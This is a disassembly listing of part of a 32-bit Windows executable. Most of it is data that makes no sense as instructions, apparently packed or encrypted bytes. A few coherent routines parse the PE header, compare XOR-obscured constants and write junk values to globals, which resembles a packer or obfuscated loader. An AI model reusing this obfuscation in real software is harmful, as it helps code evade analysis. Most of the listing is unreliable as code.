  4112b4:	lahf   
  4112b5:	stc    
  4112b6:	and    al,0x44
  4112b8:	imul   ebx,DWORD PTR [ecx-0x2c0e3af0],0x5b
  4112bf:	call   0xef89b142
  4112c4:	scas   eax,DWORD PTR es:[edi]
  4112c5:	repnz scas al,BYTE PTR es:[edi]
  4112c7:	inc    edi
  4112c8:	jl     0x411310
  4112ca:	dec    ebx
  4112cb:	jne    0x4112ff
  4112cd:	mov    cl,0x39
  4112cf:	xor    al,0x8c
  4112d1:	cmc    
  4112d2:	jno    0x4112f5
  4112d4:	add    BYTE PTR [ebp-0x1fa806af],bh
  4112da:	dec    ebp
  4112db:	test   al,cl
  4112dd:	jge    0x411299
  4112df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112e0:	inc    ebx
  4112e1:	jg     0x41134b
  4112e3:	sti    
  4112e4:	jle    0x4112eb
  4112e6:	out    0xf,al
  4112e8:	test   dh,bh
  4112ea:	add    al,BYTE PTR [eax]
  4112ec:	add    bh,al
  4112ee:	inc    ebp
  4112ef:	call   0x7471083
  4112f4:	lea    eax,[ebp-0x18]
  4112f7:	mov    DWORD PTR [ebp-0x14],eax
  4112fa:	mov    eax,DWORD PTR [ebp-0x14]
  4112fd:	add    DWORD PTR [eax],0x705fa8f
  411303:	mov    eax,DWORD PTR [ebp-0x10]
  411306:	jmp    0x4115d4
  41130b:	sub    al,0xc2
  41130d:	or     al,0xb3
  41130f:	lock jno 0x4112c3
  411312:	inc    ecx
  411313:	mov    ds:0x9f68f61e,eax
  411318:	ins    DWORD PTR es:[edi],dx
  411319:	pushf  
  41131a:	add    ecx,DWORD PTR [ecx+0x45]
  41131d:	jle    0x41139d
  41131f:	scas   eax,DWORD PTR es:[edi]
  411320:	jl     0x4113a0
  411322:	jle    0x411330
  411324:	or     eax,0xde3d3b70
  411329:	adc    eax,0x50770646
  41132e:	in     eax,0xbd
  411330:	and    bh,BYTE PTR [ebx+eax*4]
  411333:	mov    bh,0x41
  411335:	lock add al,0xb
  411338:	aad    0x3c
  41133a:	fmul   DWORD PTR [ecx+ebx*2-0x1f5e6cde]
  411341:	call   0x9a341245
  411346:	out    0xb5,eax
  411348:	cmp    al,0xaa
  41134a:	mov    WORD PTR [eax+0xe],gs
  41134d:	outs   dx,DWORD PTR ds:[esi]
  41134e:	call   0x5f408ca5
  411353:	test   al,0x8b
  411355:	scas   al,BYTE PTR es:[edi]
  411356:	mov    edx,0x2f7b7c27
  41135b:	sbb    eax,0x1ea568c8
  411360:	arpl   ax,dx
  411362:	lock loop 0x4113b5
  411365:	ja     0x411359
  411367:	mov    ebx,0xbca62586
  41136c:	jecxz  0x4113e8
  41136e:	or     DWORD PTR [ecx+0x1e03c154],eax
  411374:	push   ds
  411375:	cvttps2pi mm5,xmm7
  411378:	leave  
  411379:	aam    0x6a
  41137b:	mov    dl,0xe1
  41137d:	stc    
  41137e:	add    BYTE PTR [ecx-0x3],bl
  411381:	fucomi st,st(3)
  411383:	jo     0x411336
  411385:	sub    al,0x30
  411387:	sub    bh,al
  411389:	shl    DWORD PTR [esi],1
  41138b:	imul   ebp,DWORD PTR [ebx],0x60adb48c
  411391:	rol    DWORD PTR [esi-0x4703629],cl
  411397:	dec    eax
  411398:	and    al,0x43
  41139a:	inc    eax
  41139b:	push   ds
  41139c:	pop    ecx
  41139d:	push   eax
  41139e:	ret    
  41139f:	jmp    0xbbb58c3d
  4113a4:	xchg   edx,eax
  4113a5:	ja     0x4113c4
  4113a7:	loopne 0x41141e
  4113a9:	scas   al,BYTE PTR es:[edi]
  4113aa:	mov    al,ds:0x41d654dc
  4113af:	mov    ecx,0xa4558adc
  4113b4:	pop    esp
  4113b5:	mov    al,ds:0x1ff4e00d
  4113ba:	ret    
  4113bb:	mov    esi,0x2db872af
  4113c0:	jmp    0x411393
  4113c2:	jmp    0x2327:0x604d9577
  4113c9:	out    dx,al
  4113ca:	ror    BYTE PTR [eax-0x7d],cl
  4113cd:	loope  0x411428
  4113cf:	push   0x563c33b2
  4113d4:	int3   
  4113d5:	pop    eax
  4113d6:	outs   dx,DWORD PTR ds:[esi]
  4113d7:	rcl    eax,0x1b
  4113da:	push   ss
  4113db:	out    dx,al
  4113dc:	lods   eax,DWORD PTR ds:[esi]
  4113dd:	sbb    BYTE PTR [esi-0x6431e850],0x85
  4113e4:	sahf   
  4113e5:	mov    eax,ds:0x25b1f20b
  4113ea:	ret    
  4113eb:	lahf   
  4113ec:	mov    BYTE PTR [ebx+0x71],ch
  4113ef:	loop   0x411419
  4113f1:	dec    ebp
  4113f2:	dec    esi
  4113f3:	pop    esi
  4113f4:	cmp    eax,0xb7451d6e
  4113f9:	or     bh,al
  4113fb:	dec    eax
  4113fc:	fdiv   DWORD PTR [esi+edi*4-0x6f]
  411400:	xchg   edx,eax
  411401:	xchg   ebp,eax
  411402:	repz jb 0x41147d
  411405:	push   ecx
  411406:	lods   al,BYTE PTR ds:[esi]
  411407:	push   ds
  411408:	pop    ds
  411409:	jmp    0x4113ce
  41140b:	or     BYTE PTR [ebp-0x7278f238],dl
  411411:	xchg   ecx,eax
  411412:	mov    al,0x48
  411414:	inc    edi
  411415:	repz push ecx
  411417:	and    edx,ebp
  411419:	pop    ds
  41141a:	aad    0xf3
  41141c:	les    ecx,FWORD PTR [ebx]
  41141e:	fld    DWORD PTR [ecx-0x577ca9f5]
  411424:	inc    edx
  411425:	xchg   edi,eax
  411426:	dec    ebp
  411427:	mov    bl,0xc8
  411429:	cmp    eax,0x6998ed8c
  41142e:	gs loop 0x4113ea
  411431:	or     eax,0x155efe74
  411436:	loop   0x41145c
  411438:	in     eax,dx
  411439:	(bad)  ds:0xaafd58b8
  41143f:	sub    cl,cl
  411441:	pop    es
  411442:	xchg   edx,eax
  411443:	xchg   ecx,eax
  411444:	cmp    BYTE PTR [ebp+0x25],bl
  411447:	xchg   ebp,eax
  411448:	pop    edi
  411449:	sub    BYTE PTR [ebx],bh
  41144b:	dec    ebx
  41144c:	pushf  
  41144d:	into   
  41144e:	stos   DWORD PTR es:[edi],eax
  41144f:	jecxz  0x4113e6
  411451:	(bad)  
  411452:	fldpi  
  411454:	das    
  411455:	mov    eax,0x47ac5b71
  41145a:	stos   DWORD PTR es:[edi],eax
  41145b:	xchg   edi,eax
  41145c:	xchg   edi,eax
  41145d:	pusha  
  41145e:	retf   
  41145f:	fdivr  QWORD PTR [ebp+edi*2-0x133e86c]
  411466:	loop   0x4113f5
  411468:	xor    ax,0x2086
  41146c:	aas    
  41146d:	jo     0x4114e9
  41146f:	pop    edi
  411470:	loop   0x411475
  411472:	sti    
  411473:	popf   
  411474:	aaa    
  411475:	(bad)  [ecx]
  411477:	push   edx
  411478:	fst    DWORD PTR [ecx+edx*2-0x28e1a668]
  41147f:	int    0x83
  411481:	ja     0x4114b0
  411483:	jne    0x4114b7
  411485:	fcmovnu st,st(4)
  411487:	mov    eax,0xd70b3e3f
  41148c:	mov    ch,BYTE PTR [esi+0x67]
  41148f:	inc    ecx
  411490:	adc    esi,DWORD PTR [ebx-0x17494747]
  411496:	xorps  xmm3,XMMWORD PTR [ebx-0x47c7a5a7]
  41149d:	cmp    ah,BYTE PTR [ecx]
  41149f:	or     eax,0xaac0a456
  4114a4:	xchg   BYTE PTR [ecx+0x11],ch
  4114a7:	xchg   edi,eax
  4114a8:	out    0x50,eax
  4114aa:	sub    edx,DWORD PTR [esi+0x37a0f422]
  4114b0:	cmp    cl,dl
  4114b2:	dec    esp
  4114b3:	adc    al,0xc7
  4114b5:	into   
  4114b6:	outs   dx,BYTE PTR ds:[esi]
  4114b7:	or     eax,0xe2a4015d
  4114bc:	int3   
  4114bd:	jmp    0x11a8:0x4bebf933
  4114c4:	es aam 0x76
  4114c7:	jb     0x4114d5
  4114c9:	lahf   
  4114ca:	aaa    
  4114cb:	sbb    al,0x47
  4114cd:	lock rol BYTE PTR [eax],cl
  4114d0:	cmc    
  4114d1:	les    ecx,FWORD PTR [ebx]
  4114d3:	xor    al,ah
  4114d5:	lods   al,BYTE PTR ds:[esi]
  4114d6:	or     DWORD PTR [edx],esp
  4114d8:	int3   
  4114d9:	or     eax,0x749efda
  4114de:	repz in eax,0xcb
  4114e1:	inc    ebp
  4114e2:	(bad)  
  4114e3:	gs push edi
  4114e5:	bound  esi,QWORD PTR [edx-0x23d0275]
  4114eb:	es loope 0x4114b6
  4114ee:	adc    DWORD PTR [edi-0x24a48f61],esi
  4114f4:	mov    dl,0xc4
  4114f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114f7:	inc    ebx
  4114f8:	and    esp,esi
  4114fa:	out    0xeb,eax
  4114fc:	js     0x41153e
  4114fe:	xlat   BYTE PTR ds:[ebx]
  4114ff:	xor    DWORD PTR [ebx],eax
  411501:	ja     0x411516
  411503:	cmp    ch,BYTE PTR [ebx-0x37]
  411506:	out    dx,al
  411507:	jnp    0x411578
  411509:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41150a:	std    
  41150b:	mov    bh,0xa0
  41150d:	pop    esi
  41150e:	loop   0x4114a7
  411510:	or     ebx,eax
  411512:	or     DWORD PTR [esi+0x315a5bd7],0x68
  411519:	jno    0x411596
  41151b:	mov    eax,ds:0xc38d76a9
  411520:	call   DWORD PTR [ebp-0x578e0959]
  411526:	add    dh,BYTE PTR ds:0xe95eeb34
  41152c:	cmpps  xmm6,xmm4,0xa
  411530:	mov    gs,ecx
  411532:	xchg   DWORD PTR [eax+0x68],esp
  411535:	jecxz  0x4114c5
  411537:	push   edx
  411538:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411539:	mov    edx,0x91f673dd
  41153e:	inc    edx
  41153f:	pop    eax
  411540:	mov    esi,0xb2ac9a28
  411545:	cmp    al,BYTE PTR [ebx-0x6]
  411548:	xchg   edi,eax
  411549:	mov    edx,edx
  41154b:	fld    TBYTE PTR [esi-0x52c67709]
  411551:	neg    ah
  411553:	popa   
  411554:	pushf  
  411555:	sti    
  411556:	or     al,0xce
  411558:	sti    
  411559:	in     eax,0x91
  41155b:	cmp    DWORD PTR [eax],ebx
  41155d:	repz pop esi
  41155f:	outs   dx,DWORD PTR ds:[esi]
  411560:	and    BYTE PTR [ebp-0x75ce672b],dh
  411566:	xchg   esi,eax
  411567:	cdq    
  411568:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411569:	cmp    ebx,DWORD PTR [edi]
  41156b:	dec    esi
  41156c:	rol    BYTE PTR [esi-0x248aeca],cl
  411572:	es xor ah,al
  411575:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411576:	pusha  
  411577:	mov    esp,DWORD PTR [eax+ebp*8+0x3de94978]
  41157e:	popa   
  41157f:	(bad)  
  411581:	xchg   edi,eax
  411582:	(bad)  [esi-0x12]
  411585:	push   cs
  411586:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411587:	stos   DWORD PTR es:[edi],eax
  411588:	imul   DWORD PTR [ecx+ebx*2+0x52]
  41158c:	mov    es,WORD PTR [ebp+eax*2+0x30457728]
  411593:	and    eax,0x850fc26d
  411598:	or     DWORD PTR [esi-0x2bf45c91],ebp
  41159e:	cmp    edx,0x5a
  4115a1:	(bad)  
  4115a2:	and    BYTE PTR [bp+si+0x3c],0x89
  4115a7:	xor    DWORD PTR [ebx-0x1764664c],0xae4f78c5
  4115b1:	mov    eax,ds:0x703c159f
  4115b6:	stos   BYTE PTR es:[edi],al
  4115b7:	dec    esp
  4115b8:	pop    eax
  4115b9:	pop    esp
  4115ba:	pop    esp
  4115bb:	jnp    0x4115cd
  4115bd:	out    0xe,eax
  4115bf:	mov    cl,0x33
  4115c1:	sub    al,0xf1
  4115c3:	je     0x4115c3
  4115c5:	addr16 aam 0xd4
  4115c8:	and    eax,0xaab3eba8
  4115cd:	inc    esi
  4115ce:	int3   
  4115cf:	dec    esi
  4115d0:	xor    eax,0x8b28409a
  4115d5:	push   ebp
  4115d6:	or     BYTE PTR [ebx],dh
  4115d8:	ror    DWORD PTR [ebp+0x729b1084],0x32
  4115df:	add    BYTE PTR [ecx+0x45ff0845],cl
  4115e5:	or     al,0xe9
  4115e7:	sti    
  4115e8:	stc    
  4115e9:	(bad)  
  4115ea:	dec    DWORD PTR [ebx-0x3ecc0fbb]
  4115f0:	mov    ecx,DWORD PTR [ebp+0x10]
  4115f3:	add    eax,esi
  4115f5:	mov    DWORD PTR [ecx],eax
  4115f7:	pop    esi
  4115f8:	leave  
  4115f9:	ret    0xc
  4115fc:	push   ebp
  4115fd:	mov    ebp,esp
  4115ff:	push   ecx
  411600:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411607:	jmp    0x4117ce
  41160c:	mov    eax,ds:0x7129745c
  411611:	xor    DWORD PTR [ecx+0x74],esp
  411614:	in     eax,0xeb
  411616:	leave  
  411617:	outs   dx,DWORD PTR ds:[esi]
  411618:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411619:	mov    ds:0x40860af7,al
  41161e:	jle    0x41169e
  411620:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411621:	jg     0x4116a1
  411623:	jle    0x4115be
  411625:	and    DWORD PTR [edx-0x15],edi
  411628:	test   DWORD PTR [edx+0x43],ebx
  41162b:	jl     0x411628
  41162d:	retf   0xd5cf
  411630:	and    eax,0x9bfc0ba9
  411635:	sbb    BYTE PTR [ecx-0x13c626ae],dl
  41163b:	ins    DWORD PTR es:[edi],dx
  41163c:	xchg   edx,eax
  41163d:	xchg   edi,eax
  41163e:	pop    ebx
  41163f:	out    dx,al
  411640:	dec    ebp
  411641:	pop    esp
  411642:	jmp    0x95c0:0xde4c50f8
  411649:	ror    DWORD PTR ds:0x720bd4a2,1
  41164f:	adc    al,0x3b
  411651:	lock scas eax,DWORD PTR es:[edi]
  411653:	sbb    ah,cl
  411655:	retf   0x9845
  411658:	lea    esi,[esi+0x6d369513]
  41165e:	dec    ebp
  41165f:	push   ds
  411660:	jb     0x41169d
  411662:	sahf   
  411663:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411664:	inc    ebx
  411665:	lods   eax,DWORD PTR ds:[esi]
  411666:	test   BYTE PTR [edx+0xb7d5155],ah
  41166c:	rcl    DWORD PTR [ebp+0x1d],cl
  41166f:	or     DWORD PTR [eax+0x600d6a0d],ecx
  411675:	xchg   ecx,eax
  411676:	cpuid  
  411678:	inc    esp
  411679:	xlat   BYTE PTR ds:[ebx]
  41167a:	adc    ah,BYTE PTR ds:0xa930c28a
  411680:	inc    esi
  411681:	push   0xffffffbc
  411683:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411684:	dec    esi
  411685:	push   ebx
  411686:	mov    esi,0xe4d4788c
  41168b:	jo     0x4116bb
  41168d:	imul   esi,edx,0x54
  411690:	stc    
  411691:	xchg   BYTE PTR [edx+0x5],bl
  411694:	pop    es
  411695:	jge    0x41170b
  411697:	xchg   edx,eax
  411698:	into   
  411699:	xor    ebx,DWORD PTR [edx+0x5ba23375]
  41169f:	cmp    DWORD PTR [esi+0x1e53f2e2],0xffffff99
  4116a6:	and    esi,ebx
  4116a8:	inc    esi
  4116a9:	test   BYTE PTR [ebx+0x7e],ah
  4116ac:	or     ebx,esi
  4116ae:	and    al,0xdf
  4116b0:	mov    ?,WORD PTR [eax-0x793ccf0a]
  4116b6:	or     esp,0x3960a564
  4116bc:	and    BYTE PTR [edx-0xb],0xf4
  4116c0:	in     eax,0x81
  4116c2:	or     esi,DWORD PTR [ecx+0x622fd301]
  4116c8:	and    eax,0x6f77f755
  4116cd:	xor    ecx,DWORD PTR ds:0xaea02f1
  4116d3:	cmp    cl,BYTE PTR [eax-0x3c0eaa36]
  4116d9:	jns    0x41168d
  4116db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116dc:	je     0x411706
  4116de:	mov    ebx,0xe6a873b9
  4116e3:	lahf   
  4116e4:	cwde   
  4116e5:	test   eax,0x9fbde32f
  4116ea:	fadd   st(2),st
  4116ec:	jmp    0xb555:0x4ac0ee9f
  4116f3:	icebp  
  4116f4:	mov    bl,BYTE PTR [esi+ecx*2]
  4116f7:	les    esp,FWORD PTR [ebp+0x1134261d]
  4116fd:	test   al,0xd4
  4116ff:	scas   eax,DWORD PTR es:[edi]
  411700:	mov    al,0x9d
  411702:	mov    BYTE PTR [ecx+ecx*1-0x65],al
  411706:	lods   al,BYTE PTR ds:[esi]
  411707:	adc    ch,BYTE PTR [esi+0x60]
  41170a:	sti    
  41170b:	mov    al,ds:0x624f7802
  411710:	jbe    0x4116ad
  411712:	dec    esi
  411713:	les    eax,FWORD PTR [ecx]
  411715:	pop    ss
  411716:	mov    edi,0xc8f0d020
  41171b:	sub    ecx,DWORD PTR [eax+0x735ffe1b]
  411721:	push   ecx
  411722:	(bad)  
  411723:	cs push esi
  411725:	xchg   edx,eax
  411726:	xchg   ebx,eax
  411727:	int    0xf1
  411729:	fsubp  st(6),st
  41172b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41172c:	mov    esp,0xb6996372
  411731:	clc    
  411732:	or     DWORD PTR [edx+0x31],0x361be2af
  411739:	pushf  
  41173a:	sbb    al,ah
  41173c:	mov    edi,0x6ce1f42f
  411741:	inc    ecx
  411742:	or     eax,0xe7242fd6
  411747:	and    al,0x11
  411749:	out    dx,al
  41174a:	inc    ecx
  41174b:	sub    bl,BYTE PTR [eiz*1+0x22b06ff3]
  411752:	shl    al,cl
  411754:	out    0xfd,eax
  411756:	mov    eax,0x4c5538fb
  41175b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41175c:	hlt    
  41175d:	retf   
  41175e:	scas   eax,DWORD PTR es:[edi]
  41175f:	std    
  411760:	hlt    
  411761:	dec    ebx
  411762:	call   0x1e09:0x3abb515e
  411769:	data16 fdiv st(0),st
  41176c:	rcl    DWORD PTR [esi],cl
  41176e:	inc    ebp
  41176f:	inc    esp
  411770:	jbe    0x4117e4
  411772:	cs inc esp
  411774:	pause  
  411776:	cmp    eax,0x6618399b
  41177b:	pop    ecx
  41177c:	cs retf 0x81ac
  411780:	dec    ebx
  411781:	inc    edx
  411782:	dec    edi
  411783:	fcomp  DWORD PTR [ecx+0x1]
  411786:	mov    cl,0xef
  411788:	cmp    al,0x59
  41178a:	mov    al,0x4d
  41178c:	das    
  41178d:	or     eax,0xa930b5ba
  411792:	mov    al,BYTE PTR [esi]
  411794:	sbb    BYTE PTR [edi-0x2206170],dh
  41179a:	ficom  DWORD PTR [ecx-0x2b]
  41179d:	pusha  
  41179e:	sub    DWORD PTR [ecx-0x23],edi
  4117a1:	add    dl,BYTE PTR [ecx+ebx*4]
  4117a4:	pop    edx
  4117a5:	rol    BYTE PTR [edi],0xbf
  4117a8:	xor    DWORD PTR [edi-0x23d62cf3],0xffffffec
  4117af:	sub    eax,0x9b2790ef
  4117b4:	not    DWORD PTR [eax+0x1e]
  4117b7:	xor    cl,BYTE PTR ds:0xe26b6456
  4117bd:	int    0x49
  4117bf:	cmp    al,0x71
  4117c1:	jl     0x41178c
  4117c3:	mov    ds:0xe4413df,al
  4117c8:	in     al,dx
  4117c9:	jb     0x411837
  4117cb:	lock and esi,eax
  4117ce:	mov    eax,DWORD PTR [ebp+0x8]
  4117d1:	mov    DWORD PTR ds:0x433723,0x423d
  4117db:	mov    al,BYTE PTR [eax]
  4117dd:	sub    DWORD PTR ds:0x43367f,0x6d7d
  4117e7:	add    al,0x38
  4117e9:	xor    DWORD PTR ds:0x43371f,0x433683
  4117f3:	xor    al,0x46
  4117f5:	mov    DWORD PTR ds:0x43371f,0x735a
  4117ff:	cmp    al,0xc3
  411801:	jne    0x411aa4
  411807:	and    edx,0x7ba3
  41180d:	mov    eax,DWORD PTR [ebp+0x8]
  411810:	mov    ecx,DWORD PTR [ebp+0x8]
  411813:	add    ecx,DWORD PTR [eax+0x3c]
  411816:	and    DWORD PTR ds:0x43369b,0x4b8b
  411820:	mov    edx,0x7510854
  411825:	and    DWORD PTR ds:0x43372b,0x0
  41182f:	mov    eax,ds:0x43372b
  411834:	inc    eax
  411835:	mov    ds:0x43372b,eax
  41183a:	cmp    DWORD PTR ds:0x43372b,0xb
  411841:	jne    0x411887
  411847:	push   0x43383c
  41184c:	push   0x761c
  411851:	push   0x2832
  411856:	push   0x3f0d
  41185b:	push   0x4923
  411860:	push   DWORD PTR [ebp-0x24]
  411863:	push   DWORD PTR [ebp-0x28]
  411866:	push   DWORD PTR [ebp-0xc]
  411869:	push   0x49e1
  41186e:	push   DWORD PTR [ebp-0x28]
  411871:	push   DWORD PTR [ebp-0x14]
  411874:	push   DWORD PTR [ebp-0x10]
  411877:	push   0x6b07
  41187c:	push   0x8d34
  411881:	call   DWORD PTR ds:0x4122b8
  411887:	cmp    DWORD PTR ds:0x43372b,0xa
  41188e:	jne    0x41189f
  411894:	mov    eax,ds:0x43372b
  411899:	inc    eax
  41189a:	mov    ds:0x43372b,eax
  41189f:	cmp    DWORD PTR ds:0x43372b,0x11
  4118a6:	jb     0x41182f
  4118ac:	mov    DWORD PTR [ebp+0x8],ecx
  4118af:	mov    eax,DWORD PTR [ebp-0x4]
  4118b2:	xor    eax,edx
  4118b4:	push   esi
  4118b5:	mov    esi,DWORD PTR [ebp+0x8]
  4118b8:	mov    ecx,0x32729b
  4118bd:	add    eax,ecx
  4118bf:	cmp    DWORD PTR [esi+0x54],eax
  4118c2:	pop    esi
  4118c3:	je     0x4118d1
  4118c9:	mov    eax,DWORD PTR [ebp+0x8]
  4118cc:	jmp    0x411ab1
  4118d1:	mov    eax,DWORD PTR [ebp-0x4]
  4118d4:	xor    eax,edx
  4118d6:	jmp    0x411a9d
  4118db:	mov    ebp,0xe1e4219a
  4118e0:	gs mov ecx,0x58658ca3
  4118e6:	stos   DWORD PTR es:[edi],eax
  4118e7:	jo     0x41193c
  4118e9:	mov    ecx,0x7e4e2c39
  4118ee:	jle    0x411894
  4118f0:	jg     0x411970
  4118f2:	jle    0x411890
  4118f4:	retf   
  4118f5:	or     DWORD PTR [esi-0x7ddefd7],ecx
  4118fb:	fisubr DWORD PTR [ecx]
  4118fd:	mov    eax,?
  4118ff:	retf   0x8bc8
  411902:	dec    ecx
  411903:	popf   
  411904:	mov    ?,WORD PTR [ebp-0xc]
  411907:	stc    
  411908:	mov    ds:0x4244b740,eax
  41190d:	dec    esi
  41190e:	adc    dl,dl
  411910:	mov    ecx,0xeeab065d
  411915:	push   ds
  411916:	push   ss
  411917:	jns    0x4118b9
  411919:	sub    eax,0xe72eb30a
  41191e:	xor    DWORD PTR [ebx+0x50],eax
  411921:	(bad)  
  411922:	sbb    BYTE PTR [esi+0x390aa24a],dh
  411928:	test   bl,0x53
  41192b:	adc    DWORD PTR [esi+eax*8],edi
  41192e:	dec    edi
  41192f:	test   dl,ah
  411931:	leave  
  411932:	pop    eax
  411933:	mov    ch,0xc8
  411935:	mov    ch,BYTE PTR [esi]
  411937:	aaa    
  411938:	xor    BYTE PTR [eax*8-0x4b15a1f2],bh
  41193f:	ins    BYTE PTR es:[edi],dx
  411940:	repnz push ss
  411942:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411943:	aaa    
  411944:	adc    DWORD PTR [eax+0x4a],0xb1d84da9
  41194b:	inc    esp
  41194c:	inc    eax
  41194d:	jno    0x411936
  41194f:	sub    al,BYTE PTR [eax+0x38]
  411952:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411953:	iret   
  411954:	jmp    0x4118db
  411956:	fwait
  411957:	inc    edx
  411958:	out    dx,al
  411959:	add    al,0xff
  41195b:	repz bound eax,QWORD PTR [esp+edi*2]
  41195f:	inc    esp
  411960:	loop   0x4119d9
  411962:	mov    ds:0x9c23ca18,al
  411967:	or     cl,BYTE PTR [ebp+0x12]
  41196a:	xchg   esi,eax
  41196b:	sbb    eax,0x53d15704
  411970:	add    DWORD PTR [esi+0x5d],edx
  411973:	(bad)  
  411974:	call   0x6071e563
  411979:	and    DWORD PTR [ebx+0x34fb54a5],0x18
  411980:	cdq    
  411981:	inc    ebp
  411982:	push   0xffffffa3
  411984:	pop    eax
  411985:	test   al,0xb
  411987:	sti    
  411988:	fiadd  WORD PTR [esp+ecx*1]
  41198b:	xor    ecx,eax
  41198d:	push   cs
  41198e:	mov    esi,0x7fd2caf4
  411993:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411994:	sub    edx,DWORD PTR [eax+esi*2+0x59]
  411998:	ja     0x411996
  41199a:	hlt    
  41199b:	(bad)  
  41199c:	cli    
  41199d:	sbb    BYTE PTR [eax],bl
  41199f:	ror    DWORD PTR [esi],cl
  4119a1:	xor    eax,0x46784610
  4119a6:	fcom   QWORD PTR [ebx-0x76]
  4119a9:	je     0x41192e
  4119ab:	jg     0x4119d5
  4119ad:	inc    eax
  4119ae:	fist   DWORD PTR [esp+edi*4+0x78]
  4119b2:	mov    ds:0xe4e51fb8,eax
  4119b7:	fisubr DWORD PTR [eax+ebp*4-0x1806f119]
  4119be:	mov    dh,0x34
  4119c0:	dec    ecx
  4119c1:	in     al,0x50
  4119c3:	or     al,0xed
  4119c5:	rol    DWORD PTR [ecx],1
  4119c7:	mov    cl,0xc9
  4119c9:	fild   DWORD PTR [ebx]
  4119cb:	xor    DWORD PTR [edx],edx
  4119cd:	pop    eax
  4119ce:	mov    edx,0xd43f5a16
  4119d3:	pop    es
  4119d4:	sub    al,0x1c
  4119d6:	or     DWORD PTR [ebx+0x1ae67d80],0xd1552ffa
  4119e0:	push   ds
  4119e1:	pop    ebx
  4119e2:	mov    edx,DWORD PTR [edx+0x75c32477]
  4119e8:	cmp    ecx,DWORD PTR [eax]
  4119ea:	add    DWORD PTR [edx],ebp
  4119ec:	scas   al,BYTE PTR es:[edi]
  4119ed:	jmp    DWORD PTR [edi]
  4119ef:	push   0x69
  4119f1:	sbb    BYTE PTR [edx+0x4b],0xf1
  4119f5:	ret    
  4119f6:	fnsave [esi]
  4119f8:	sbb    eax,0x78b613ae
  4119fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119fe:	or     al,0x8f
  411a00:	loopne 0x411a14
  411a02:	mov    esi,0xc75867c5
  411a07:	and    eax,0x196aeb30
  411a0c:	add    dh,ah
  411a0e:	lds    ebp,FWORD PTR [eax+eiz*2+0x67]
  411a12:	xchg   ecx,eax
  411a13:	xchg   edi,eax
  411a14:	add    edx,DWORD PTR [ebp+0x34]
  411a17:	mov    edi,0xda4cd682
  411a1c:	pusha  
  411a1d:	test   eax,0x3c738de9
  411a22:	push   edi
  411a23:	mov    ch,0x72
  411a25:	inc    edi
  411a26:	leave  
  411a27:	add    BYTE PTR ss:[edx+eiz*4],0xa9
  411a2c:	sub    DWORD PTR [ebx-0x537c35c5],esi
  411a32:	ror    edi,cl
  411a34:	adc    dh,BYTE PTR [edi-0x3f9429b5]
  411a3a:	jle    0x411a70
  411a3c:	xchg   ebx,eax
  411a3d:	xchg   esp,eax
  411a3e:	iret   
  411a3f:	fild   DWORD PTR [edx]
  411a41:	stc    
  411a42:	(bad)  
  411a43:	es fwait
  411a45:	mov    ds:0x182239d7,al
  411a4a:	stos   BYTE PTR es:[edi],al
  411a4b:	imul   BYTE PTR [esi-0x6ba402a]
  411a51:	and    DWORD PTR [eax-0x5a],edi
  411a54:	xchg   esp,eax
  411a55:	cli    
  411a56:	leave  
  411a57:	rol    DWORD PTR [ebx],1
  411a59:	push   eax
  411a5a:	mov    eax,ds:0x51664e91
  411a5f:	loop   0x411a87
  411a61:	sbb    DWORD PTR [esi-0x7b],esi
  411a64:	addr16 mov dh,0xe1
  411a67:	sub    DWORD PTR [ecx+0x4a62864b],eax
  411a6d:	adc    cl,BYTE PTR ds:0x596e1c11
  411a73:	shl    DWORD PTR [ebp-0xa],0xc7
  411a77:	adc    BYTE PTR [ecx],ah
  411a79:	fcomi  st,st(6)
  411a7b:	ficom  WORD PTR [ecx-0x44c060cd]
  411a81:	enter  0xc631,0xbf
  411a85:	sub    eax,0x82cc8328
  411a8a:	test   al,0xb3
  411a8c:	and    eax,0xa81dac2f
  411a91:	jo     0x411a5b
  411a93:	imul   esp,DWORD PTR [eax],0xffffffb9
  411a96:	aaa    
  411a97:	adc    bl,bh
  411a99:	sti    
  411a9a:	cmp    BYTE PTR [eax],0x4
  411a9d:	add    eax,ecx
  411a9f:	jmp    0x411ab1
  411aa4:	mov    eax,DWORD PTR [ebp-0x4]
  411aa7:	xor    eax,0x7510854
  411aac:	add    eax,0x32729b
  411ab1:	leave  
  411ab2:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    al,0x29
  412002:	add    DWORD PTR [eax],eax
  412004:	sub    DWORD PTR ss:[ecx],eax
  412007:	add    BYTE PTR [eax+0x29],al
  41200a:	add    DWORD PTR [eax],eax
  41200c:	dec    esi
  41200d:	sub    DWORD PTR [ecx],eax
  41200f:	add    BYTE PTR [eax+0x29],bl
  412012:	add    DWORD PTR [eax],eax
  412014:	bound  ebp,QWORD PTR [ecx]
  412016:	add    DWORD PTR [eax],eax
  412018:	ins    BYTE PTR es:[edi],dx
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    BYTE PTR [esi+0x29],dh
  41201e:	add    DWORD PTR [eax],eax
  412020:	mov    BYTE PTR [ecx],ch
  412022:	add    DWORD PTR [eax],eax
  412024:	xchg   edx,eax
  412025:	sub    DWORD PTR [ecx],eax
  412027:	add    BYTE PTR [edx-0x5dfffed7],bl
  41202d:	sub    DWORD PTR [ecx],eax
  41202f:	add    BYTE PTR [esi-0x43fffed7],ch
  412035:	sub    DWORD PTR [ecx],eax
  412037:	add    dh,al
